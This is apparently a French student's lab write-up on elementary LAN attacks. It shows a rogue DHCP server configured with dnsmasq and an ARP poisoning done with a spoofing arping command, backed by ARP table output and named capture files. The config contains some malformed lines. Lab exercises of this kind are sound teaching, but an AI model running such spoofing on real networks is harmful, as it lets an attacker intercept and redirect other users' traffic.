# Part 4 : real haxor
Allez une partie un peu sécu offensive ☠️☠️☠️, qu'on s'amuse avec les attaques élémentaires un peu sur tout ça.

Une seule est obligatoire : le DHCP spoofing. Les autres sont bonus.

### 1. DHCP spoofing

🌞 Installez et configurez un serveur DHCP sur votre machine attaquante

ip attaquant: 10.1.1.254/24`.
Service DHCP via dnsmasq coupé avec port=0 dans le fichier conf.
On a comme ip attribuer : 10.1.1.116 qui est dans entre 100 et 250.

```
interfaces=enp0s3
dhcp-range=10.1.1.10 .1.1.250,255.255.255.0,12h
dhcp-lease-max=40
dhcp-leasefile=/var/lib/dnsmasq/dnsmasq.leases
log-dhcp
port=0
```

### 3. ARP poisoning

A. Simple poisoning

🌞 Proof !

```
PC1> show arp

arp table is empty

PC1> show arp

08:00:27:f4:87:d3  10.1.1.253 expires in 113 seconds
```

````
sudo arping -I enp0s3 -U -c 10 -s 10.1.1.253 10.1.1.1
```

En tant qu'attaquant 10.1.1.254 j'ai envoyé des trames ARP en usurpant 10.1.1.253, la table ARP de PC1 associe l'IP serveur DHCP légitime à la MAC de l'attaquant.

📁 p4_poisoning.pcap

B. MITM

🌞 Proof !

📁 p4_mitm.pcap
